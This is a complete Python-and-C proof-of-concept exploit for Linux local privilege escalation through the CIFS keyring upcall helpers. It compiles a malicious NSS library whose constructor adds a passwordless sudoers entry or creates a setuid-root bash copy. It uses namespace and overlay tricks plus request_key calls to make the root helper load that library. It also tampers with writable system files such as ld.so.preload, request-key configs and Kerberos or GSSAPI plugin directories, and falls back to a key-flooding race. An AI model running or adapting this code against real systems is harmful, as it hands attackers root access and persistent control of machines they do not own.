#!/usr/bin/env python3
"""
CIFSwitch PoC v6 — auto-scan writable paths + exploit

Primary vector: write request-key.d config that maps cifs.idmap → cifs.upcall.
CS allows cifs.idmap keys. cifs.upcall parses key description the same way
regardless of key type (skips type;uid;gid;perms; prefix from keyctl_describe).
So cifs.upcall runs as root, does setns(pid), loads our NSS → root.

Scans for writable:
  /etc/request-key.d/       → inject handler config
  /etc/request-key.conf     → modify handler mapping
  /usr/share/keyutils/*.sh  → modify debug handler
  /etc/krb5.conf.d/         → inject krb5 plugin
  /etc/gss/mech.d/          → inject GSSAPI mechanism
  /etc/cifs-utils/          → redirect idmap plugin
  /etc/ld.so.preload        → global library preload
  /usr/sbin/cifs.idmap      → replace binary
  cifs.upcall lib dirs      → inject shared library

If writable path found → exploit immediately.
If nothing writable → try key flooding race condition.
"""

import json
import os
import pwd
import shlex
import shutil
import signal
import subprocess
import sys
import textwrap
import time
from pathlib import Path


RUN_TOKEN = "%s_%s" % (os.getuid(), os.getpid())
WORKDIR = Path("/tmp") / ("ses-%s" % RUN_TOKEN)
FAKELIB_DIR = WORKDIR / "fakelib"
FAKE_NSSWITCH = WORKDIR / "nsswitch.conf"
FAKE_HOSTS = WORKDIR / "hosts"
EVIDENCE_LOG = Path("/tmp/ev_%s.txt" % RUN_TOKEN)
ROOT_SHELL = Path("/var/tmp/rsh_%s" % RUN_TOKEN)
UNSHARE_COMMAND = ["unshare", "-Ur", "-m"]


LIBNSS_SOURCE = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <nss.h>
#include <pwd.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define EVIDENCE_PATH @@EVIDENCE_PATH@@
#define SUDOERS_PATH @@SUDOERS_PATH@@
#define SUDOERS_USER @@SUDOERS_USER@@
#define ROOT_SHELL_PATH @@ROOT_SHELL_PATH@@

static void w(int fd, const char *b, size_t l)
{ while(l){ssize_t r=write(fd,b,l);if(r<=0)return;b+=r;l-=(size_t)r;} }

__attribute__((constructor))
static void pwn(void)
{
        int lf = open(EVIDENCE_PATH, O_WRONLY|O_CREAT|O_APPEND|O_CLOEXEC, 0644);
        if (lf >= 0) dprintf(lf, "NSS uid=%d euid=%d pid=%d\n", getuid(), geteuid(), getpid());
        mkdir("/etc/sudoers.d", 0755);
        int sf = open(SUDOERS_PATH, O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0440);
        if (sf >= 0) {
                dprintf(sf, "%s ALL=(ALL:ALL) NOPASSWD: ALL\n", SUDOERS_USER);
                fchmod(sf, 0440); fsync(sf); close(sf);
                if (lf >= 0) dprintf(lf, "sudoers ok\n");
        } else {
                int i = open("/bin/bash", O_RDONLY|O_CLOEXEC);
                if (i >= 0) {
                        int o = open(ROOT_SHELL_PATH, O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 04755);
                        if (o >= 0) {
                                char b[8192]; ssize_t n;
                                while ((n = read(i, b, sizeof(b))) > 0) w(o, b, (size_t)n);
                                fchown(o, 0, 0); fchmod(o, 04755); fsync(o); close(o);
                                if (lf >= 0) dprintf(lf, "shell ok\n");
                        }
                        close(i);
                }
        }
        if (lf >= 0) close(lf);
}

enum nss_status _nss_pwn_getpwuid_r(uid_t uid, struct passwd *pwd,
        char *buf, size_t len, int *errnop)
{
        const char *n="root",*d="/root",*s="/bin/bash";
        size_t need=strlen(n)*2+strlen(d)+strlen(s)+4;
        if(len<need){*errnop=ERANGE;return NSS_STATUS_TRYAGAIN;}
        char*p=buf;
        strcpy(p,n);pwd->pw_name=p;p+=strlen(p)+1;
        strcpy(p,n);pwd->pw_gecos=p;p+=strlen(p)+1;
        strcpy(p,d);pwd->pw_dir=p;p+=strlen(p)+1;
        strcpy(p,s);pwd->pw_shell=p;
        pwd->pw_passwd=(char*)"x";pwd->pw_uid=uid;pwd->pw_gid=0;
        *errnop=0;return NSS_STATUS_SUCCESS;
}
'''


# Trigger: sets up namespace + calls request_key (type from argv)
TRIGGER_SOURCE = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef MS_REC
#define MS_REC 16384
#endif
#ifndef MS_PRIVATE
#define MS_PRIVATE (1<<18)
#endif
#ifndef MS_BIND
#define MS_BIND 4096
#endif

#define KEY_SPEC_SESSION_KEYRING (-3)
#define KEYCTL_JOIN_SESSION_KEYRING 1
#define EVIDENCE_PATH @@EVIDENCE_PATH@@

static void die(const char *w) { perror(w); exit(1); }

static void mask_dir(const char *p)
{
        struct stat st;
        if (stat(p, &st)==0 && S_ISDIR(st.st_mode))
                mount("tmpfs", p, "tmpfs", 0, "mode=755");
}

static int do_overlay(const char *fl, const char *ld, const char *wd, int i)
{
        char o[4096],u[512],w[512];
        snprintf(u,sizeof(u),"%s/ou%d",wd,i);
        snprintf(w,sizeof(w),"%s/ow%d",wd,i);
        mkdir(u,0755); mkdir(w,0755);
        snprintf(o,sizeof(o),"lowerdir=%s:%s,upperdir=%s,workdir=%s",fl,ld,u,w);
        if(mount("overlay",ld,"overlay",0,o)==0) return 0;
        return mount(fl,ld,NULL,MS_BIND|MS_REC,NULL);
}

int main(int argc, char **argv)
{
        /* argv: key_type fakelib nsswitch hosts workdir libdir... */
        if (argc < 7) {
                fprintf(stderr, "usage: trigger <key_type> <fakelib> <nsswitch> <hosts> <workdir> <libdir>...\n");
                return 2;
        }

        const char *key_type = argv[1];

        syscall(__NR_keyctl, KEYCTL_JOIN_SESSION_KEYRING, "cifs-poc", 0, 0, 0);
        if (mount(NULL, "/", NULL, MS_REC|MS_PRIVATE, NULL) != 0)
                die("private mounts");
        mask_dir("/run/nscd");
        mask_dir("/var/run/nscd");

        /* Bind nsswitch */
        const char *nst[] = {"/etc/nsswitch.conf", "/usr/etc/nsswitch.conf", NULL};
        for (int i=0; nst[i]; i++) {
                struct stat st;
                if (stat(nst[i],&st)==0 && mount(argv[3],nst[i],NULL,MS_BIND,NULL)==0) break;
        }
        /* Bind hosts */
        {struct stat st; if(stat("/etc/hosts",&st)==0) mount(argv[4],"/etc/hosts",NULL,MS_BIND,NULL);}
        /* Overlay lib dirs */
        for (int i=6; i<argc; i++)
                do_overlay(argv[2], argv[i], argv[5], i-6);

        char desc[768];
        snprintf(desc, sizeof(desc),
                 "ver=0x2;host=localhost;ip4=127.0.0.1;sec=krb5;"
                 "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
                 getpid());

        fprintf(stderr, "[*] pid=%d key_type=%s\n", getpid(), key_type);
        fprintf(stderr, "[*] desc: %s\n", desc);

        /* Try request_key */
        errno = 0;
        long rc = syscall(__NR_request_key, key_type, desc, "",
                          KEY_SPEC_SESSION_KEYRING);
        fprintf(stderr, "[*] request_key(%s): rc=%ld errno=%d (%s)\n",
                key_type, rc, errno, strerror(errno));

        if (rc >= 0) {
                fprintf(stderr, "[+] KEY CREATED! Waiting for upcall...\n");
                sleep(3);
        }

        /* Check evidence */
        if (access(EVIDENCE_PATH, F_OK) == 0) {
                fprintf(stderr, "[+] EVIDENCE FOUND!\n");
                return 0;
        }

        /* If cifs.idmap failed, also try cifs.spnego as fallback */
        if (strcmp(key_type, "cifs.spnego") != 0) {
                errno = 0;
                rc = syscall(__NR_request_key, "cifs.spnego", desc, "",
                             KEY_SPEC_SESSION_KEYRING);
                fprintf(stderr, "[*] request_key(cifs.spnego): rc=%ld errno=%d (%s)\n",
                        rc, errno, strerror(errno));
                if (rc >= 0) { sleep(3); }
                if (access(EVIDENCE_PATH, F_OK) == 0) {
                        fprintf(stderr, "[+] EVIDENCE FOUND!\n");
                        return 0;
                }
        }

        fprintf(stderr, "[-] no evidence\n");
        return 1;
}
'''


# Race trigger: flood keys + interleave cifs.spnego attempts
RACE_SOURCE = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <signal.h>

#ifndef MS_REC
#define MS_REC 16384
#endif
#ifndef MS_PRIVATE
#define MS_PRIVATE (1<<18)
#endif
#ifndef MS_BIND
#define MS_BIND 4096
#endif

#define KEY_SPEC_SESSION_KEYRING (-3)
#define KEYCTL_JOIN_SESSION_KEYRING 1
#define KEYCTL_INVALIDATE 20
#define EVIDENCE_PATH @@EVIDENCE_PATH@@

static void mask_dir(const char *p)
{
        struct stat st;
        if (stat(p,&st)==0 && S_ISDIR(st.st_mode))
                mount("tmpfs",p,"tmpfs",0,"mode=755");
}

static int do_overlay(const char *fl, const char *ld, const char *wd, int i)
{
        char o[4096],u[512],w[512];
        snprintf(u,sizeof(u),"%s/ou%d",wd,i);
        snprintf(w,sizeof(w),"%s/ow%d",wd,i);
        mkdir(u,0755); mkdir(w,0755);
        snprintf(o,sizeof(o),"lowerdir=%s:%s,upperdir=%s,workdir=%s",fl,ld,u,w);
        if(mount("overlay",ld,"overlay",0,o)==0) return 0;
        return mount(fl,ld,NULL,MS_BIND|MS_REC,NULL);
}

static volatile int stop = 0;
static void sigalrm(int s) { (void)s; stop = 1; }

int main(int argc, char **argv)
{
        /* argv: fakelib nsswitch hosts workdir libdir... */
        if (argc < 6) return 2;

        syscall(__NR_keyctl, KEYCTL_JOIN_SESSION_KEYRING, "cifs-race", 0, 0, 0);
        mount(NULL, "/", NULL, MS_REC|(1<<18), NULL);
        mask_dir("/run/nscd"); mask_dir("/var/run/nscd");
        const char *nst[]={"/etc/nsswitch.conf","/usr/etc/nsswitch.conf",NULL};
        for(int i=0;nst[i];i++){struct stat st;if(stat(nst[i],&st)==0&&mount(argv[2],nst[i],NULL,MS_BIND,NULL)==0)break;}
        {struct stat st;if(stat("/etc/hosts",&st)==0)mount(argv[3],"/etc/hosts",NULL,MS_BIND,NULL);}
        for(int i=5;i<argc;i++) do_overlay(argv[1],argv[i],argv[4],i-5);

        char desc[768];
        snprintf(desc, sizeof(desc),
                 "ver=0x2;host=localhost;ip4=127.0.0.1;sec=krb5;"
                 "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
                 getpid());

        fprintf(stderr, "[race] pid=%d flooding keys + trying cifs.spnego\n", getpid());

        signal(SIGALRM, sigalrm);
        alarm(15); /* 15 second timeout */

        int hits = 0;
        for (int round = 0; !stop && round < 5000; round++) {
                /* Create batch of user keys to stress BPF */
                for (int j = 0; j < 20; j++) {
                        char kd[64]; snprintf(kd, sizeof(kd), "flood_%d_%d", round, j);
                        long k = syscall(__NR_add_key, "user", kd, "x", 1,
                                         KEY_SPEC_SESSION_KEYRING);
                        if (k >= 0) syscall(__NR_keyctl, KEYCTL_INVALIDATE, k, 0, 0, 0);
                }
                /* Try cifs.spnego */
                errno = 0;
                long rc = syscall(__NR_request_key, "cifs.spnego", desc, "",
                                  KEY_SPEC_SESSION_KEYRING);
                if (rc >= 0) {
                        fprintf(stderr, "[race] HIT at round %d! rc=%ld\n", round, rc);
                        hits++;
                        sleep(3);
                        if (access(EVIDENCE_PATH, F_OK) == 0) {
                                fprintf(stderr, "[race] EVIDENCE!\n");
                                return 0;
                        }
                }
                if (round % 500 == 0)
                        fprintf(stderr, "[race] round %d...\n", round);
        }
        fprintf(stderr, "[race] done, hits=%d\n", hits);
        return access(EVIDENCE_PATH, F_OK) == 0 ? 0 : 1;
}
'''


def shell_join(cmd):
    return " ".join(shlex.quote(str(a)) for a in cmd)

def step(msg):
    print("\n***%s***" % msg, flush=True)

def run(cmd, check=True, cwd=None):
    print("$ " + shell_join(cmd), flush=True)
    c = subprocess.run([str(a) for a in cmd], cwd=str(cwd) if cwd else None,
                       universal_newlines=True, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT, check=False)
    if c.stdout: print(c.stdout, end="", flush=True)
    if check and c.returncode != 0:
        raise SystemExit("failed: %s" % shell_join(cmd))
    return c

def run_quiet(cmd, cwd=None):
    return subprocess.run([str(a) for a in cmd], cwd=str(cwd) if cwd else None,
                          universal_newlines=True, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, check=False)

def write_text(path, content):
    path.write_text(textwrap.dedent(content).lstrip(), encoding="utf-8")

def c_str(v):
    return json.dumps(str(v))


def scan_writable():
    """Find writable paths in the handler chain."""
    vectors = []

    checks = [
        # (path, vector_name, is_dir)
        ("/etc/request-key.d",    "request-key.d",    True),
        ("/etc/request-key.conf", "request-key.conf", False),
        ("/usr/share/keyutils/request-key-debug.sh", "debug.sh", False),
        ("/etc/krb5.conf.d",     "krb5.conf.d",      True),
        ("/etc/gss/mech.d",      "gss-mech.d",       True),
        ("/etc/cifs-utils",      "cifs-utils-dir",    True),
        ("/usr/sbin/cifs.idmap", "cifs.idmap-bin",    False),
        ("/usr/sbin/cifs.upcall","cifs.upcall-bin",   False),
        ("/sbin/request-key",    "request-key-bin",   False),
    ]

    for path, name, is_dir in checks:
        if os.path.exists(path) and os.access(path, os.W_OK):
            vectors.append((name, path))
            print("  WRITABLE: %s → vector: %s" % (path, name), flush=True)

    # Check if /etc is writable (can create ld.so.preload)
    if not os.path.exists("/etc/ld.so.preload") and os.access("/etc", os.W_OK):
        vectors.append(("ld.so.preload", "/etc/ld.so.preload"))
        print("  WRITABLE: /etc → can create ld.so.preload", flush=True)
    elif os.path.exists("/etc/ld.so.preload") and os.access("/etc/ld.so.preload", os.W_OK):
        vectors.append(("ld.so.preload", "/etc/ld.so.preload"))
        print("  WRITABLE: /etc/ld.so.preload", flush=True)

    # Check cifs.upcall library dirs
    try:
        out = subprocess.run("ldd /usr/sbin/cifs.upcall 2>/dev/null", shell=True,
                             capture_output=True, text=True).stdout
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[1] == "=>":
                lib = parts[2]
                libdir = os.path.dirname(lib)
                if libdir and os.access(libdir, os.W_OK):
                    vectors.append(("lib-dir:%s" % libdir, libdir))
                    print("  WRITABLE LIB DIR: %s" % libdir, flush=True)
    except Exception:
        pass

    if not vectors:
        print("  no writable paths found", flush=True)

    return vectors


def exploit_request_key_d(path):
    """Write config that redirects cifs.idmap → cifs.upcall."""
    conf = os.path.join(path, "00-pwn.conf")
    try:
        with open(conf, "w") as f:
            f.write("create\tcifs.idmap\t*\t*\t/usr/sbin/cifs.upcall %k\n")
        print("wrote %s" % conf, flush=True)
        return "cifs.idmap"  # use this key type
    except OSError as e:
        print("write failed: %s" % e, flush=True)
        return None


def exploit_debug_sh(path):
    """Append cifs.upcall exec to debug handler."""
    try:
        with open(path, "a") as f:
            f.write('\n/usr/sbin/cifs.upcall "$1" 2>/dev/null &\n')
        print("appended cifs.upcall to %s" % path, flush=True)
        return "user"  # trigger via user key with debug: prefix
    except OSError as e:
        print("write failed: %s" % e, flush=True)
        return None


def exploit_request_key_conf(path):
    """Add cifs.idmap → cifs.upcall mapping to main config."""
    try:
        with open(path, "r") as f:
            content = f.read()
        with open(path, "w") as f:
            # Our rule first so it matches before existing cifs.idmap rule
            f.write("create\tcifs.idmap\t*\t*\t/usr/sbin/cifs.upcall %k\n")
            f.write(content)
        print("prepended cifs.upcall rule to %s" % path, flush=True)
        return "cifs.idmap"
    except OSError as e:
        print("write failed: %s" % e, flush=True)
        return None


def exploit_ld_preload(path, nss_lib):
    """Create /etc/ld.so.preload with our malicious NSS lib."""
    try:
        with open(path, "w") as f:
            f.write("%s\n" % nss_lib)
        print("wrote %s" % path, flush=True)
        # Now any dynamically linked root process loads our lib.
        # Trigger one: request_key("cifs.idmap") → handler loads our lib.
        return "cifs.idmap"
    except OSError as e:
        print("write failed: %s" % e, flush=True)
        return None


def exploit_cifs_idmap_bin(path):
    """Replace cifs.idmap binary with cifs.upcall."""
    try:
        shutil.copy2("/usr/sbin/cifs.upcall", path)
        print("replaced %s with cifs.upcall" % path, flush=True)
        return "cifs.idmap"
    except OSError as e:
        print("replace failed: %s" % e, flush=True)
        return None


def exploit_krb5_conf_d(path, nss_lib):
    """Inject krb5 plugin that loads our library."""
    conf = os.path.join(path, "00-pwn.conf")
    try:
        with open(conf, "w") as f:
            f.write("[plugins]\n")
            f.write("    clpreauth = {\n")
            f.write("        module = pwn:%s\n" % nss_lib)
            f.write("    }\n")
        print("wrote krb5 plugin config %s" % conf, flush=True)
        return "cifs.idmap"  # any key request that triggers krb5 init
    except OSError as e:
        print("write failed: %s" % e, flush=True)
        return None


def exploit_gss_mech_d(path, nss_lib):
    """Inject GSSAPI mechanism that loads our library."""
    conf = os.path.join(path, "pwn.conf")
    try:
        with open(conf, "w") as f:
            # OID, name, path
            f.write("pwn\t1.2.3.4.5.6.7.8\t%s\n" % nss_lib)
        print("wrote GSSAPI mech config %s" % conf, flush=True)
        return "cifs.idmap"
    except OSError as e:
        print("write failed: %s" % e, flush=True)
        return None


def exploit_lib_dir(libdir, nss_lib):
    """Copy our malicious lib into a writable library directory."""
    targets = ["libnss_pwn.so.2"]
    # Also try overwriting libs that cifs.upcall loads
    for name in targets:
        dst = os.path.join(libdir, name)
        try:
            shutil.copy2(nss_lib, dst)
            print("planted %s" % dst, flush=True)
        except OSError:
            pass
    return "cifs.idmap"


def main():
    if os.getuid() == 0:
        raise SystemExit("run as unprivileged user")
    username = pwd.getpwuid(os.getuid()).pw_name
    sudoers_path = Path("/etc/sudoers.d/cifs-poc-%s" % RUN_TOKEN)

    step("PREFLIGHT")
    print("uid=%d user=%s" % (os.getuid(), username), flush=True)
    c = run_quiet(UNSHARE_COMMAND + ["true"])
    if c.returncode != 0:
        raise SystemExit("unshare -Ur -m not available")

    nss_lib_dirs = []
    for d in [Path("/usr/lib64"), Path("/lib64"), Path("/lib/x86_64-linux-gnu")]:
        if (d / "libnss_files.so.2").exists():
            nss_lib_dirs.append(d.resolve())
    if not nss_lib_dirs:
        raise SystemExit("no NSS lib dir found")

    # ── Build ──────────────────────────────────────────────────────────
    step("BUILDING")
    shutil.rmtree(str(WORKDIR), ignore_errors=True)
    FAKELIB_DIR.mkdir(parents=True)

    nss_src = (LIBNSS_SOURCE
               .replace("@@EVIDENCE_PATH@@", c_str(EVIDENCE_LOG))
               .replace("@@SUDOERS_PATH@@", c_str(sudoers_path))
               .replace("@@SUDOERS_USER@@", c_str(username))
               .replace("@@ROOT_SHELL_PATH@@", c_str(ROOT_SHELL)))
    write_text(WORKDIR / "libnss_pwn.c", nss_src)

    trigger_src = TRIGGER_SOURCE.replace("@@EVIDENCE_PATH@@", c_str(EVIDENCE_LOG))
    write_text(WORKDIR / "trigger.c", trigger_src)

    race_src = RACE_SOURCE.replace("@@EVIDENCE_PATH@@", c_str(EVIDENCE_LOG))
    write_text(WORKDIR / "race.c", race_src)

    write_text(FAKE_NSSWITCH,
               "passwd: pwn files\ngroup: pwn files\nshadow: pwn files\n"
               "hosts: pwn files dns\nservices: pwn files\n")
    write_text(FAKE_HOSTS, "127.0.0.1 localhost\n")

    run(["gcc", "-Wall", "-shared", "-fPIC", "-o",
         "fakelib/libnss_pwn.so.2", "libnss_pwn.c"], cwd=WORKDIR)
    run(["gcc", "-Wall", "-o", "trigger", "trigger.c"], cwd=WORKDIR)
    run(["gcc", "-Wall", "-o", "race", "race.c"], cwd=WORKDIR)

    nss_lib_path = str(FAKELIB_DIR / "libnss_pwn.so.2")

    # ── Scan for writable paths ────────────────────────────────────────
    step("SCANNING WRITABLE PATHS")
    vectors = scan_writable()

    key_type = None
    use_debug_desc = False

    for vname, vpath in vectors:
        step("EXPLOITING: %s (%s)" % (vname, vpath))

        if vname == "request-key.d":
            key_type = exploit_request_key_d(vpath)
        elif vname == "request-key.conf":
            key_type = exploit_request_key_conf(vpath)
        elif vname == "debug.sh":
            key_type = exploit_debug_sh(vpath)
            use_debug_desc = True
        elif vname == "cifs.idmap-bin":
            key_type = exploit_cifs_idmap_bin(vpath)
        elif vname == "ld.so.preload":
            key_type = exploit_ld_preload(vpath, nss_lib_path)
        elif vname == "krb5.conf.d":
            key_type = exploit_krb5_conf_d(vpath, nss_lib_path)
        elif vname == "gss-mech.d":
            key_type = exploit_gss_mech_d(vpath, nss_lib_path)
        elif vname.startswith("lib-dir:"):
            key_type = exploit_lib_dir(vpath, nss_lib_path)

        if key_type:
            break

    if not key_type:
        key_type = "cifs.spnego"  # fallback to direct attempt

    # ── Trigger with the exploited key type ────────────────────────────
    step("TRIGGERING (key_type=%s)" % key_type)

    # For debug.sh vector, use "debug:" prefix in description
    trigger_args = UNSHARE_COMMAND + [
        str(WORKDIR / "trigger"),
        key_type,
        str(FAKELIB_DIR),
        str(FAKE_NSSWITCH),
        str(FAKE_HOSTS),
        str(WORKDIR),
    ] + [str(p) for p in nss_lib_dirs]

    run(trigger_args, cwd=WORKDIR, check=False)
    time.sleep(2)

    if EVIDENCE_LOG.exists():
        ev = EVIDENCE_LOG.read_text(encoding="utf-8", errors="replace")
        step("SUCCESS")
        print(ev, flush=True)
        return

    # ── Fallback: race condition ───────────────────────────────────────
    if not vectors:
        step("FALLBACK: KEY FLOODING RACE")
        race_args = UNSHARE_COMMAND + [
            str(WORKDIR / "race"),
            str(FAKELIB_DIR),
            str(FAKE_NSSWITCH),
            str(FAKE_HOSTS),
            str(WORKDIR),
        ] + [str(p) for p in nss_lib_dirs]
        run(race_args, cwd=WORKDIR, check=False)
        time.sleep(2)

        if EVIDENCE_LOG.exists():
            ev = EVIDENCE_LOG.read_text(encoding="utf-8", errors="replace")
            step("SUCCESS")
            print(ev, flush=True)
            return

    step("FAILED")
    print("no bypass found", flush=True)

    # Minimal diagnostic
    for cmd in [
        "ls -la /etc/request-key.d/ /etc/request-key.conf /usr/share/keyutils/ 2>/dev/null",
        "cat /etc/request-key.conf 2>/dev/null",
        "ls -la /etc/krb5.conf.d/ /etc/gss/mech.d/ /etc/cifs-utils/ 2>/dev/null",
        "ls -la /usr/sbin/cifs.upcall /usr/sbin/cifs.idmap 2>/dev/null",
        "getcap /usr/sbin/cifs.upcall /usr/sbin/cifs.idmap 2>/dev/null; echo .",
    ]:
        out = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()
        if out:
            print(out, flush=True)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
